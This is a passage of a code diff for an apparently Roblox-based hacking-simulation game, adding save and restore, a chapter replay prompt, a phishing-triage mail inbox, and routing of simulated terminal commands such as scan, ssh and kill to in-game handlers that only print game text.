-addLine("psrep - list simulated processes")
-addLine('grep "<term>" <file> - search inside simulated logs')
-addLine("malwarescan - simulate malware scan")
-addLine("kill <pid> - terminate simulated process")
-addLine("ls [path] - list simulated files")
-addLine("cat <file> - read simulated file")
-addLine("openfile <file> - open simulated file")
-addLine("closefile <file> - close simulated file")
-addLine("echo <text> - print text")
-addLine("rm <file> - remove simulated file")
-addLine("passwd <text> - password set/check (sim)")
-addLine("baitcheck <text> - detect phishing clues (sim)")
-addLine("decoymail <text> - inspect suspicious email tone (sim)")
-addLine("crack-ng <target> - password policy audit (sim)")
-addLine("admin <on|off> - toggle admin mode (sim)")
-addLine("save | load - save/load progress")
-addLine("clear - clear terminal")
-addLine("time - show time")
-addLine("Browser links: hackos://home, bloxplay.com/admin, RBXPacketNet.com")
+terminalState = {
+currentHost = type(terminal.currentHost) == "string" and terminal.currentHost or "local",
+currentDir = type(terminal.currentDir) == "string" and terminal.currentDir or "/",
+connectedHost = type(terminal.connectedHost) == "string" and terminal.connectedHost or nil,
+sshSession = terminal.sshSession == true,
+scanCache = type(terminal.scanCache) == "string" and terminal.scanCache or nil,
+sniffCache = sniffCache,
+lastAttackerIP = type(terminal.lastAttackerIP) == "string" and terminal.lastAttackerIP or "203.44.18.77",
+}
+ActivePacketCapture = {
+targetIP = type(packetCapture.targetIP) == "string" and packetCapture.targetIP or "",
+targetLabel = type(packetCapture.targetLabel) == "string" and packetCapture.targetLabel or "",
+rows = {},
+}
+if ActivePacketCapture.targetIP ~= "" then
+startPacketCaptureForIP(ActivePacketCapture.targetIP)
+end
+OpenFiles = {}
+if type(state.openFiles) == "table" then
+for _, pathName in ipairs(state.openFiles) do
+if type(pathName) == "string" and pathName ~= "" then
+OpenFiles[pathName] = true
+end
+end
+end
+if UrlBox then
+UrlBox.Text = browserState.currentUrl == "about:blank" and "" or browserState.currentUrl
+end
+if PacketIPBox then
+PacketIPBox.Text = ActivePacketCapture.targetIP
+end
+if PacketDNSBox then
+PacketDNSBox.Text = ""
+end
+if PacketPage and PacketPage.Visible then
+populatePacketRows()
+end
+setVisiblePanel(browserState.visiblePanel, {
+url = browserState.visiblePanel == "browser" and browserState.currentUrl or nil,
+navigate = browserState.visiblePanel == "browser",
+captureFocus = false,
+})
+started = true
+installSimOps()
+return true
+end
+applyPendingRestoreState = function()
+local raw = Player:GetAttribute(RESTORE_STATE_ATTRIBUTE)
+if type(raw) ~= "string" or raw == "" then
+return false
+end
+Player:SetAttribute(RESTORE_STATE_ATTRIBUTE, nil)
+local ok, state = pcall(function()
+return Http:JSONDecode(raw)
+end)
+if not ok or type(state) ~= "table" then
+return false
+end
+return applyProgressState(state)
 end
 local function resetUI()
+local previousBrowserState = browserState
 if TermOut then
-TermOut:ClearAllChildren()
-mk("UIListLayout", { Parent = TermOut, Name = "UIListLayout", Padding = UDim.new(0, 4), SortOrder = Enum.SortOrder.LayoutOrder })
-addLine(PROMPT)
+resetTerminalOutput(PROMPT)
 end
 if TermInput then TermInput.Text = "" end
-browserState = { adminLoggedIn = false, currentUrl = "about:blank" }
+browserState = { adminLoggedIn = false, currentUrl = "about:blank", stickyNoteInspected = false, adminTab = "database", blockedIPs = {}, selectedMailId = type(CHAPTER3_MAILBOX[1]) == "table" and tostring(CHAPTER3_MAILBOX[1].id or "") or "", logStreamStartedAt = 0, logsLastRender = 0, lastInteractionAt = os.clock(), idleAutoSaveNotified = false, visiblePanel = "terminal" }
+for key, value in pairs(previousBrowserState or {}) do
+if type(key) == "string" and key:sub(1, 1) == "_" then
+browserState[key] = value
+end
+end
 terminalState = {
 currentHost = "local",
 currentDir = "/",
@@ -1237,30 +1569,630 @@ commandHistory = {}
 historyIndex = nil
 currentDraft = ""
 if UrlBox then UrlBox.Text = "" end
-if BrowserFrame and BrowserFrame.Visible then navigateTo("about:blank") end
-Player:SetAttribute("Obj_Admin", false)
+if BrowserFrame then navigateTo("about:blank") end
+setVisiblePanel("terminal", { navigate = false, captureFocus = false })
+installSimOps()
+applyPendingRestoreState()
 end
+
 local function getScenarioRemote(name)
-local remotes = ReplicatedStorage:FindFirstChild("Remotes")
-if not remotes then
-return nil
+return getRemote(name)
 end
-return remotes:FindFirstChild(name)
+local function buildReplayPromptGUI()
+if ReplayPromptGUI then
+return ReplayPromptGUI
 end
-local function syncScenarioProgress(raw)
+local gui = mk("ScreenGui", {
+Parent = PlayerGui,
+Name = "HackTabletReplayPrompt",
+IgnoreGuiInset = true,
+ResetOnSpawn = false,
+DisplayOrder = 250,
+Enabled = false,
+})
+local shade = mk("TextButton", {
+Parent = gui,
+AutoButtonColor = false,
+Modal = true,
+Text = "",
+Size = UDim2.fromScale(1, 1),
+BackgroundColor3 = Color3.fromRGB(4, 7, 12),
+BackgroundTransparency = 0.18,
+})
+local panel = mk("Frame", {
+Parent = shade,
+BackgroundColor3 = Color3.fromRGB(15, 20, 32),
+Size = UDim2.fromOffset(460, 250),
+Position = UDim2.fromScale(0.5, 0.5),
+AnchorPoint = Vector2.new(0.5, 0.5),
+})
+round(panel, 18)
+mk("TextLabel", {
+Parent = panel,
+BackgroundTransparency = 1,
+Font = Enum.Font.GothamBlack,
+TextSize = 26,
+TextColor3 = Color3.fromRGB(235, 242, 255),
+Text = "MISSION COMPLETE",
+Size = UDim2.new(1, -40, 0, 34),
+Position = UDim2.new(0, 20, 0, 22),
+})
+mk("TextLabel", {
+Parent = panel,
+BackgroundTransparency = 1,
+Font = Enum.Font.Gotham,
+TextSize = 16,
+TextColor3 = Color3.fromRGB(186, 201, 228),
+TextWrapped = true,
+Text = "You finished Chapter 4. Do you want to play the operation again from the beginning?",
+Size = UDim2.new(1, -40, 0, 58),
+Position = UDim2.new(0, 20, 0, 68),
+})
+mk("TextLabel", {
+Parent = panel,
+BackgroundTransparency = 1,
+Font = Enum.Font.GothamSemibold,
+TextSize = 13,
+TextColor3 = Color3.fromRGB(255, 194, 102),
+TextWrapped = true,
+Text = "Your saved progress has been removed, so Continue will show No Save Found.",
+Size = UDim2.new(1, -40, 0, 40),
+Position = UDim2.new(0, 20, 0, 132),
+})
+local playAgainBtn = mk("TextButton", {
+Parent = panel,
+Name = "PlayAgainButton",
+AutoButtonColor = true,
+Text = "PLAY AGAIN",
+Font = Enum.Font.GothamBold,
+TextSize = 15,
+TextColor3 = Color3.new(1, 1, 1),
+BackgroundColor3 = Color3.fromRGB(79, 131, 255),
+BorderSizePixel = 0,
+Size = UDim2.new(0, 170, 0, 42),
+Position = UDim2.new(0.5, -182, 1, -62),
+})
+round(playAgainBtn, 12)
+local doneBtn = mk("TextButton", {
+Parent = panel,
+Name = "DoneButton",
+AutoButtonColor = true,
+Text = "NOT NOW",
+Font = Enum.Font.GothamBold,
+TextSize = 15,
+TextColor3 = Color3.fromRGB(220, 231, 248),
+BackgroundColor3 = Color3.fromRGB(46, 57, 79),
+BorderSizePixel = 0,
+Size = UDim2.new(0, 170, 0, 42),
+Position = UDim2.new(0.5, 12, 1, -62),
+})
+round(doneBtn, 12)
+ReplayPromptGUI = gui
+return gui
+end
+local function setReplayPromptVisible(visible)
+if not ReplayPromptGUI then
+buildReplayPromptGUI()
+end
+if ReplayPromptGUI then
+ReplayPromptGUI.Enabled = visible == true
+end
+end
+local function clearEndingAutosave()
+if replayPromptClearDone then
+return
+end
+autoSaveSuppressed = true
+autoSaveQueuedAt = 0
+replayPromptClearDone = true
+local clearRemote = getScenarioRemote("ClearSavedProgress")
+if not clearRemote then
+return
+end
+local ok, result = pcall(function()
+return clearRemote:InvokeServer()
+end)
+if ok and type(result) == "table" and type(result.warning) == "string" and result.warning ~= "" then
+warn("[HackTablet] ClearSavedProgress warning:", result.warning)
+elseif not ok then
+warn("[HackTablet] ClearSavedProgress invoke failed")
+end
+end
+local function startReplayRun()
+local startOverRemote = getScenarioRemote(START_OVER_REMOTE_NAME)
+if not startOverRemote then
+notify({ Title = "HackTablet", Text = "Start Over is unavailable right now.", Duration = 3 })
+return
+end
+local promptGui = buildReplayPromptGUI()
+local playAgainBtn = promptGui:FindFirstChild("PlayAgainButton", true)
+local doneBtn = promptGui:FindFirstChild("DoneButton", true)
+if playAgainBtn and playAgainBtn:IsA("TextButton") then
+playAgainBtn.Text = "STARTING..."
+playAgainBtn.Active = false
+playAgainBtn.Selectable = false
+end
+if doneBtn and doneBtn:IsA("TextButton") then
+doneBtn.Active = false
+doneBtn.Selectable = false
+end
+local okReset, resetResult = pcall(function()
+return startOverRemote:InvokeServer()
+end)
+if playAgainBtn and playAgainBtn:IsA("TextButton") then
+playAgainBtn.Text = "PLAY AGAIN"
+playAgainBtn.Active = true
+playAgainBtn.Selectable = true
+end
+if doneBtn and doneBtn:IsA("TextButton") then
+doneBtn.Active = true
+doneBtn.Selectable = true
+end
+if not okReset or type(resetResult) ~= "table" or not resetResult.success then
+notify({ Title = "HackTablet", Text = type(resetResult) == "table" and tostring(resetResult.message or "Could not start over.") or "Could not start over.", Duration = 3 })
+return
+end
+autoSaveSuppressed = false
+autoSaveQueuedAt = 0
+autoSaveLastRunAt = os.clock()
+replayPromptShown = false
+replayPromptClearDone = false
+Player:SetAttribute(RESTORE_STATE_ATTRIBUTE, nil)
+resetUI()
+local loadScenarioRemote = getScenarioRemote("LoadScenario")
+if not loadScenarioRemote then
+notify({ Title = "HackTablet", Text = "Could not load Chapter 1.", Duration = 3 })
+return
+end
+local okLoad, loadResult = pcall(function()
+return loadScenarioRemote:InvokeServer("Chapter1_Recon")
+end)
+if not okLoad or type(loadResult) ~= "table" then
+notify({ Title = "HackTablet", Text = "Could not load Chapter 1.", Duration = 3 })
+return
+end
+setReplayPromptVisible(false)
+if HintGUI then
+HintGUI.Enabled = false
+end
+if MainGUI then
+MainGUI.Enabled = true
+end
+started = true
+if browserState._ensureClockLoop then
+browserState._ensureClockLoop()
+end
+if browserState._updateClockLabel then
+browserState._updateClockLabel()
+end
+playAudio()
+setVisiblePanel("missions", { navigate = false, captureFocus = false })
+if browserState._refreshMissionPanels then
+browserState._refreshMissionPanels()
+end
+if browserState._markInteraction then
+browserState._markInteraction()
+end
+notify({ Title = "HackTablet", Text = "Fresh run loaded. Check your tablet instructions.", Duration = 4 })
+end
+local function showReplayPrompt()
+if replayPromptShown then
+return
+end
+replayPromptShown = true
+clearEndingAutosave()
+autoSaveSuppressed = true
+autoSaveQueuedAt = 0
+stopAudio()
+if TermInput then
+pcall(function()
+TermInput:ReleaseFocus()
+end)
+end
+local promptGui = buildReplayPromptGUI()
+local playAgainBtn = promptGui:FindFirstChild("PlayAgainButton", true)
+local doneBtn = promptGui:FindFirstChild("DoneButton", true)
+if playAgainBtn and playAgainBtn:IsA("TextButton") then
+playAgainBtn.MouseButton1Click:Once(function()
+startReplayRun()
+end)
+end
+if doneBtn and doneBtn:IsA("TextButton") then
+doneBtn.MouseButton1Click:Once(function()
+setReplayPromptVisible(false)
+if isToolEquipped() and started then
+playAudio()
+end
+notify({ Title = "HackTablet", Text = "Saved progress removed. Continue will show No Save Found.", Duration = 4 })
+end)
+end
+setReplayPromptVisible(true)
+end
+local function syncScenarioProgress(raw, options)
+options = options or {}
 local checkSolutionRemote = getScenarioRemote("CheckSolution")
 if not checkSolutionRemote then
-return
+return nil
 end
 local ok, result = pcall(function()
 return checkSolutionRemote:InvokeServer(raw)
 end)
 if not ok or type(result) ~= "table" then
-return
+return nil
 end
-if result.success and (result.stepComplete or result.chapterComplete) and type(result.feedback) == "string" and result.feedback ~= "" then
+local completedScenarioId = tostring(result.completedScenarioId or "")
+local finalChapterComplete = result.success and result.chapterComplete and completedScenarioId == "Chapter4_IncidentResponse"
+if result.success and not finalChapterComplete then
+queueAutoSave(result.stepComplete or result.chapterComplete)
+end
+if result.success and result.autoStartedNextChapter and type(result.nextTitle) == "string" and result.nextTitle ~= "" then
+	notify({
+		Title = "HackTablet",
+		Text = ("%s started. Check your tablet for the next instructions."):format(result.nextTitle),
+		Duration = 4,
+	})
+	if not options.silent then
+		addLine(("[*] %s started."):format(result.nextTitle))
+		if type(result.nextInstruction) == "string" and result.nextInstruction ~= "" then
+			addLine(("[*] %s"):format(result.nextInstruction))
+		end
+	end
+	task.defer(function()
+		if browserState._ensureChapter3MailVisible then
+			browserState._ensureChapter3MailVisible()
+		end
+	end)
+end
+if not options.silent and result.success and (result.stepComplete or result.chapterComplete) and type(result.feedback) == "string" and result.feedback ~= "" then
 addLine(result.feedback)
 end
+if finalChapterComplete then
+task.defer(showReplayPrompt)
+end
+return result
+end
+local function getScenarioSessionInfo()
+local getSessionInfoRemote = getScenarioRemote("GetSessionInfo")
+if not getSessionInfoRemote then
+return nil
+end
+local ok, sessionInfo = pcall(function()
+return getSessionInfoRemote:InvokeServer()
+end)
+if ok and type(sessionInfo) == "table" then
+return sessionInfo
+end
+return nil
+end
+
+browserState._getMailEntryById = function(emailId)
+if type(emailId) == "string" and emailId ~= "" then
+for _, entry in ipairs(CHAPTER3_MAILBOX) do
+if type(entry) == "table" and tostring(entry.id or "") == emailId then
+return entry
+end
+end
+end
+return nil
+end
+browserState._resolveSelectedMail = function()
+local selectedMail = browserState._getMailEntryById and browserState._getMailEntryById(browserState.selectedMailId) or nil
+if selectedMail then
+browserState.selectedMailId = tostring(selectedMail.id or "")
+return selectedMail
+end
+local fallbackMail = type(CHAPTER3_MAILBOX[1]) == "table" and CHAPTER3_MAILBOX[1] or nil
+browserState.selectedMailId = fallbackMail and tostring(fallbackMail.id or "") or ""
+return fallbackMail
+end
+browserState._getMailTriageState = function()
+local sessionInfo = getScenarioSessionInfo()
+if type(sessionInfo) ~= "table" or sessionInfo.scenarioId ~= "Chapter3_Malware" then
+return {
+currentStepId = nil,
+resolved = {},
+actions = {},
+resolvedCount = 0,
+total = #CHAPTER3_MAILBOX,
+}
+end
+local stepState = type(sessionInfo.stepState) == "table" and type(sessionInfo.stepState.ch3_inbox_triage) == "table" and sessionInfo.stepState.ch3_inbox_triage or {}
+local resolved = type(stepState.resolved) == "table" and stepState.resolved or {}
+local actions = type(stepState.actions) == "table" and stepState.actions or {}
+local resolvedCount = 0
+for _, entry in ipairs(CHAPTER3_MAILBOX) do
+if type(entry) == "table" and resolved[tostring(entry.id or "")] == true then
+resolvedCount = resolvedCount + 1
+end
+end
+return {
+sessionInfo = sessionInfo,
+currentStepId = sessionInfo.stepId,
+resolved = resolved,
+actions = actions,
+resolvedCount = resolvedCount,
+total = #CHAPTER3_MAILBOX,
+}
+end
+browserState._ensureChapter3MailVisible = function()
+if not MainGUI or not MainGUI.Enabled or not BrowserFrame or not TermFrame then
+return
+end
+local sessionInfo = getScenarioSessionInfo()
+if type(sessionInfo) ~= "table" or sessionInfo.scenarioId ~= "Chapter3_Malware" then
+browserState.mailAutoOpenStepId = nil
+return
+end
+local stepId = tostring(sessionInfo.stepId or "")
+if stepId ~= "ch3_mail_site" and stepId ~= "ch3_inbox_triage" then
+browserState.mailAutoOpenStepId = nil
+return
+end
+if browserState.mailAutoOpenStepId == stepId then
+return
+end
+browserState.mailAutoOpenStepId = stepId
+setVisiblePanel("browser", { navigate = false, captureFocus = false })
+if stepId == "ch3_mail_site" then
+navigateTo("mail.bloxplay.com")
+else
+browserState.currentUrl = "mail.bloxplay.com"
+if UrlBox then
+UrlBox.Text = "mail.bloxplay.com"
+end
+showMailPage("mail.bloxplay.com")
+setBrowserStatus("BloxMail reopened for the Chapter 3 inbox triage step.")
+end
+end
+browserState._renderMailPage = function()
+local mailPage = BrowserContent and BrowserContent:FindFirstChild("MailPage")
+if not mailPage then return end
+local inboxList = mailPage:FindFirstChild("MailInboxList")
+local detailCard = mailPage:FindFirstChild("MailDetailCard")
+if not inboxList or not detailCard then return end
+local triageState = browserState._getMailTriageState and browserState._getMailTriageState() or { resolved = {}, actions = {}, resolvedCount = 0, total = #CHAPTER3_MAILBOX }
+local summaryLabel = mailPage:FindFirstChild("MailInboxSummary")
+if (browserState.selectedMailId == nil or browserState.selectedMailId == "") and type(CHAPTER3_MAILBOX[1]) == "table" then
+browserState.selectedMailId = tostring(CHAPTER3_MAILBOX[1].id or "")
+end
+local selectedMail = browserState._resolveSelectedMail and browserState._resolveSelectedMail() or nil
+if selectedMail then
+browserState.selectedMailId = tostring(selectedMail.id or "")
+end
+for _, child in ipairs(inboxList:GetChildren()) do
+if child:IsA("GuiButton") or child:IsA("Frame") then
+child:Destroy()
+end
+end
+if summaryLabel and summaryLabel:IsA("TextLabel") then
+local pendingCount = math.max(0, triageState.total - triageState.resolvedCount)
+if #CHAPTER3_MAILBOX == 0 then
+summaryLabel.Text = "Inbox queue unavailable. Reloading fallback mail data."
+elseif triageState.currentStepId == "ch3_inbox_triage" then
+summaryLabel.Text = ("%d total emails. %d resolved, %d still waiting in the left inbox queue."):format(triageState.total, triageState.resolvedCount, pendingCount)
+elseif triageState.resolvedCount >= triageState.total and triageState.total > 0 then
+summaryLabel.Text = "Inbox triage is complete. Move to the live incident logs next."
+else
+summaryLabel.Text = "Use the left inbox queue to inspect each message, then choose Report or Pass Through."
+end
+end
+if #CHAPTER3_MAILBOX == 0 then
+local emptyRow = mk("Frame", {
+Parent = inboxList,
+BackgroundColor3 = Color3.fromRGB(243, 246, 251),
+BorderSizePixel = 0,
+Size = UDim2.new(1, -8, 0, 58),
+})
+round(emptyRow, 8)
+mk("TextLabel", {
+Parent = emptyRow,
+BackgroundTransparency = 1,
+Text = "Inbox unavailable (sim).",
+Font = Enum.Font.Gotham,
+TextSize = 14,
+TextColor3 = Color3.fromRGB(75, 84, 98),
+TextXAlignment = Enum.TextXAlignment.Left,
+Position = UDim2.new(0, 12, 0, 18),
+Size = UDim2.new(1, -24, 0, 20),
+})
+else
+for index, entry in ipairs(CHAPTER3_MAILBOX) do
+local emailId = tostring(entry.id or ("mail_" .. index))
+local isSelected = browserState.selectedMailId == emailId
+local resolvedAction = triageState.actions[emailId]
+local statusText = "Pending"
+local chipColor = Color3.fromRGB(152, 163, 179)
+local rowColor = isSelected and Color3.fromRGB(228, 236, 248) or Color3.fromRGB(244, 247, 252)
+if resolvedAction == "report" then
+statusText = "FLAGGED"
+chipColor = Color3.fromRGB(191, 71, 58)
+rowColor = isSelected and Color3.fromRGB(250, 234, 231) or Color3.fromRGB(252, 242, 239)
+elseif resolvedAction == "pass" then
+statusText = "AUTHORIZED"
+chipColor = Color3.fromRGB(61, 136, 92)
+rowColor = isSelected and Color3.fromRGB(229, 244, 234) or Color3.fromRGB(240, 249, 242)
+end
+local row = mk("TextButton", {
+Parent = inboxList,
+BackgroundColor3 = rowColor,
+BorderSizePixel = 0,
+ClipsDescendants = true,
+AutoButtonColor = false,
+Text = "",
+Size = UDim2.new(1, -8, 0, 52),
+})
+round(row, 8)
+row.MouseButton1Click:Connect(function()
+browserState.selectedMailId = emailId
+queueAutoSave(false)
+if browserState._renderMailPage then
+browserState._renderMailPage()
+end
+end)
+mk("TextLabel", {
+Parent = row,
+BackgroundTransparency = 1,
+Text = tostring(entry.subject or "Untitled message"),
+TextTruncate = Enum.TextTruncate.AtEnd,
+Font = Enum.Font.GothamBold,
+TextSize = 13,
+TextColor3 = Color3.fromRGB(25, 30, 38),
+TextXAlignment = Enum.TextXAlignment.Left,
+Position = UDim2.new(0, 12, 0, 8),
+Size = UDim2.new(1, -118, 0, 18),
+})
+mk("TextLabel", {
+Parent = row,
+BackgroundTransparency = 1,
+Text = tostring(entry.sender or "Unknown sender"),
+TextTruncate = Enum.TextTruncate.AtEnd,
+Font = Enum.Font.Code,
+TextSize = 11,
+TextColor3 = Color3.fromRGB(76, 86, 102),
+TextXAlignment = Enum.TextXAlignment.Left,
+Position = UDim2.new(0, 12, 0, 28),
+Size = UDim2.new(1, -118, 0, 14),
+})
+local chip = mk("TextLabel", {
+Parent = row,
+BackgroundColor3 = chipColor,
+BorderSizePixel = 0,
+Text = statusText,
+Font = Enum.Font.GothamBold,
+TextSize = 11,
+TextColor3 = Color3.new(1, 1, 1),
+Position = UDim2.new(1, -100, 0, 16),
+Size = UDim2.new(0, 88, 0, 20),
+})
+round(chip, 6)
+end
+end
+task.defer(function()
+local layout = inboxList:FindFirstChild("UIListLayout")
+inboxList.CanvasSize = UDim2.new(0, 0, 0, ((layout and layout.AbsoluteContentSize.Y) or 0) + 10)
+end)
+selectedMail = browserState._resolveSelectedMail and browserState._resolveSelectedMail() or nil
+local senderLabel = detailCard:FindFirstChild("MailDetailSender")
+local subjectLabel = detailCard:FindFirstChild("MailDetailSubject")
+local bodyFrame = detailCard:FindFirstChild("MailDetailBodyFrame")
+local bodyLabel = bodyFrame and bodyFrame:FindFirstChild("MailDetailBody")
+local statusLabel = detailCard:FindFirstChild("MailStatusLabel")
+local actionHintLabel = detailCard:FindFirstChild("MailActionHintLabel")
+local reportButton = detailCard:FindFirstChild("MailReportButton", true)
+local passButton = detailCard:FindFirstChild("MailPassButton", true)
+if senderLabel and senderLabel:IsA("TextLabel") then
+senderLabel.Text = "FROM: " .. tostring(selectedMail and selectedMail.sender or "No sender selected")
+end
+if subjectLabel and subjectLabel:IsA("TextLabel") then
+subjectLabel.Text = "SUBJECT: " .. tostring(selectedMail and selectedMail.subject or "No message selected")
+end
+if bodyLabel and bodyLabel:IsA("TextLabel") then
+bodyLabel.Text = tostring(selectedMail and selectedMail.body or "Select a message from the inbox to inspect it.")
+end
+if detailCard and detailCard:IsA("ScrollingFrame") then
+detailCard.CanvasPosition = Vector2.new(0, 0)
+end
+local selectedAction = selectedMail and triageState.actions[tostring(selectedMail.id or "")] or nil
+local isMailStepActive = triageState.currentStepId == "ch3_mail_site" or triageState.currentStepId == "ch3_inbox_triage"
+local canClassify = selectedMail ~= nil and triageState.total > 0 and selectedAction == nil
+if statusLabel and statusLabel:IsA("TextLabel") then
+if triageState.total == 0 then
+statusLabel.Text = "Inbox unavailable."
+elseif selectedAction == "report" then
+statusLabel.Text = "This message has been FLAGGED as phishing."
+elseif selectedAction == "pass" then
+statusLabel.Text = "This message has been AUTHORIZED to pass through."
+elseif triageState.resolvedCount >= triageState.total and triageState.total > 0 then
+statusLabel.Text = "Inbox triage complete. Move to the admin Security Logs tab."
+elseif isMailStepActive then
+statusLabel.Text = ("%d/%d messages reviewed. Keep sorting the queue before the incident escalates."):format(triageState.resolvedCount, triageState.total)
+else
+statusLabel.Text = "Review the selected message before deciding whether it should be reported."
+end
+end
+if actionHintLabel and actionHintLabel:IsA("TextLabel") then
+if selectedAction == "report" then
+actionHintLabel.Text = "FLAGGED messages stay blocked from the staff inbox."
+elseif selectedAction == "pass" then
+actionHintLabel.Text = "AUTHORIZED messages are safe to let through the staff inbox."
+elseif canClassify and isMailStepActive then
+actionHintLabel.Text = "Report phishing mail. Pass Through legitimate internal mail."
+elseif canClassify then
+actionHintLabel.Text = "Choose an action and the server will validate it against the active Chapter 3 review step."
+elseif triageState.resolvedCount >= triageState.total and triageState.total > 0 then
+actionHintLabel.Text = "Inbox review is complete. Move to the live incident response tools."
+else
+actionHintLabel.Text = "This message is waiting for the active Chapter 3 mail review step."
+end
+end
+if reportButton and reportButton:IsA("TextButton") then
+reportButton.Active = canClassify
+reportButton.AutoButtonColor = canClassify
+reportButton.BackgroundColor3 = canClassify and Color3.fromRGB(184, 61, 61) or Color3.fromRGB(154, 161, 170)
+reportButton.TextTransparency = canClassify and 0 or 0.18
+end
+if passButton and passButton:IsA("TextButton") then
+passButton.Active = canClassify
+passButton.AutoButtonColor = canClassify
+passButton.BackgroundColor3 = canClassify and Color3.fromRGB(63, 142, 96) or Color3.fromRGB(154, 161, 170)
+passButton.TextTransparency = canClassify and 0 or 0.18
+end
+end
+browserState._classifySelectedMail = function(action)
+local selectedMail = browserState._resolveSelectedMail and browserState._resolveSelectedMail() or nil
+if not selectedMail then
+setBrowserStatus("No inbox message selected.")
+return
+end
+local triageState = browserState._getMailTriageState and browserState._getMailTriageState() or { currentStepId = nil, resolvedCount = 0, total = #CHAPTER3_MAILBOX }
+if triageState.total > 0 and triageState.resolvedCount >= triageState.total then
+setBrowserStatus("Inbox triage already complete.")
+if browserState._renderMailPage then
+browserState._renderMailPage()
+end
+return
+end
+local result = syncScenarioProgress(("browser_mail %s %s"):format(tostring(selectedMail.id or ""), tostring(action or "report")), { silent = true })
+local actionLabel = tostring(action or "") == "pass" and "authorized" or "flagged"
+if result and result.stepComplete then
+setBrowserStatus(("Message %s. Inbox triage complete. WannaWail activity is now hitting office systems."):format(actionLabel))
+elseif result and result.success then
+local progressText = type(result.feedback) == "string" and result.feedback or ""
+if progressText ~= "" then
+setBrowserStatus(("Message %s. %s"):format(actionLabel, progressText))
+else
+setBrowserStatus(("Message %s."):format(actionLabel))
+end
+elseif result and type(result.output) == "string" and result.output ~= "" then
+setBrowserStatus(result.output:gsub('%s+', ' '))
+else
+setBrowserStatus("Could not reach the mail classification service. Try again.")
+end
+if browserState._renderMailPage then
+browserState._renderMailPage()
+end
+end
+local function scenarioStepMatches(stepIds)
+if type(stepIds) ~= "table" or #stepIds == 0 then
+return true
+end
+local sessionInfo = getScenarioSessionInfo()
+local currentStepId = sessionInfo and sessionInfo.stepId
+if type(currentStepId) ~= "string" or currentStepId == "" then
+return false
+end
+for _, stepId in ipairs(stepIds) do
+if currentStepId == stepId then
+return true
+end
+end
+return false
+end
+submitScenarioAction = function(raw, stepIds)
+if not scenarioStepMatches(stepIds) then
+return nil
+end
+return syncScenarioProgress(raw, { silent = true })
 end
 local function showScenarioHint()
 local getHintRemote = getScenarioRemote("GetHint")
@@ -1285,6 +2217,7 @@ for w in raw:gmatch("%S+") do
 args[#args + 1] = w
 end
 local cmd = (args[1] or ""):lower()
+local simOps = browserState._simOps or {}
 if cmd == "" then
 addLine(PROMPT)
 return
@@ -1299,35 +2232,31 @@ end
 local function parseQuotedAndFile(input)
 local pat, file = input:match('^%s*"(.-)"%s+(.+)$')
 if pat and file then return pat, file end
-local a, b = input:match("^(%S+)%s+(.+)$")
-return a, b
+local tokens = {}
+for token in tostring(input or ""):gmatch("%S+") do
+ tokens[#tokens + 1] = token
+end
+if #tokens < 2 then
+ return nil, nil
+end
+local lastToken = tokens[#tokens]
+tokens[#tokens] = nil
+return table.concat(tokens, " "), lastToken
 end
 if cmd == "help" then
-showHelp()
+simOps.showHelp()
 elseif cmd == "hint" then
 showScenarioHint()
 elseif cmd == "apps" then
-addLine("Apps (SIM): terminal, browser, notes (soon), RBXPacketNet, admin portal")
+addLine("Apps (SIM): terminal, browser, BloxMail, RBXPacketNet, admin portal, RBXIPBlocker")
 addLine("Tip: open browser")
 elseif cmd == "open" then
 local which = (args[2] or ""):lower()
 if which == "terminal" then
-TermFrame.Visible = true
-BrowserFrame.Visible = false
-MissionsFrame.Visible = false
-if TermInput then TermInput:CaptureFocus() end
+setVisiblePanel("terminal")
 addLine("Switched to Terminal.")
 elseif which == "browser" then
-TermFrame.Visible = false
-BrowserFrame.Visible = true
-MissionsFrame.Visible = false
-if UrlBox and UrlBox.Text == "" then
-UrlBox.Text = "home"
-navigateTo("home")
-else
-navigateTo(UrlBox.Text)
-end
-pcall(function() UrlBox:CaptureFocus() end)
+setVisiblePanel("browser")
 addLine("Switched to Browser.")
 elseif which == "notes" then
 addLine("Notes app (sim) coming soon")
@@ -1340,74 +2269,83 @@ addLine("Opening " .. (target ~= "" and target or "about:blank") .. " ... (sim)"
 if UrlBox then UrlBox.Text = target end
 navigateTo(target)
 elseif cmd == "scan" then
-showScan(rest(2))
+simOps.showScan(rest(2))
 elseif cmd == "sniff" then
-showSniff(rest(2))
+simOps.showSniff(rest(2))
 elseif cmd == "packets" then
-showPackets(rest(2))
+simOps.showPackets(rest(2))
 elseif cmd == "devices" then
-showDevices()
+simOps.showDevices()
 elseif cmd == "mac" then
-showMac(args[2] or "")
+simOps.showMac(args[2] or "")
 elseif cmd == "connect" then
-fakeConnect(rest(2))
+simOps.fakeConnect(rest(2))
 elseif cmd == "ssh" then
-fakeSSH(rest(2))
+simOps.fakeSSH(rest(2))
 elseif cmd == "exit" then
-fakeExit()
+simOps.fakeExit()
 elseif cmd == "netstat" then
-fakeNetstat()
+simOps.fakeNetstat()
+elseif cmd == "pwd" then
+simOps.showWorkingDirectory()
+elseif cmd == "cd" then
+simOps.changeDirectory(rest(2))
 elseif cmd == "psrep" or (cmd == "ps" and (args[2] or "") == "aux") then
-fakePsrep()
+simOps.fakePsrep()
 elseif cmd == "grep" then
 local pattern, file = parseQuotedAndFile(rest(2))
-fakeGrep(pattern, file)
+simOps.fakeGrep(pattern, file)
 elseif cmd == "malwarescan" then
-fakeMalwareScan()
+simOps.fakeMalwareScan()
+elseif cmd == "firewall" then
+simOps.fakeFirewall(rest(2))
+elseif cmd == "jamcam" or cmd == "jamcamera" then
+simOps.fakeJamCam(rest(2))
 elseif cmd == "kill" then
-fakeKill(args[2] or "")
+simOps.fakeKill(args[2] or "")
 elseif cmd == "ls" then
-listPath(args[2] or "")
+simOps.listPath(rest(2))
+elseif cmd == "stat" then
+simOps.showStat(rest(2))
+elseif cmd == "find" then
+simOps.findEntries(rest(2))
 elseif cmd == "cat" then
-catFile(rest(2))
+simOps.catFile(rest(2))
 elseif cmd == "openfile" then
-openFile(rest(2))
+simOps.openFile(rest(2))
 elseif cmd == "closefile" then
-closeFile(rest(2))
+simOps.closeFile(rest(2))
 elseif cmd == "echo" then
 addLine(rest(2))
 elseif cmd == "rm" then
-removeFile(rest(2))
+simOps.removeFile(rest(2))
 elseif cmd == "passwd" then
-fakePasswd(rest(2))
+simOps.fakePasswd(rest(2))
 elseif cmd == "baitcheck" then
-phishCheck(rest(2))
+simOps.phishCheck(rest(2))
 elseif cmd == "decoymail" then
-decoyMail(rest(2))
+simOps.decoyMail(rest(2))
 elseif cmd == "crack-ng" then
-fakeCrackNG(rest(2))
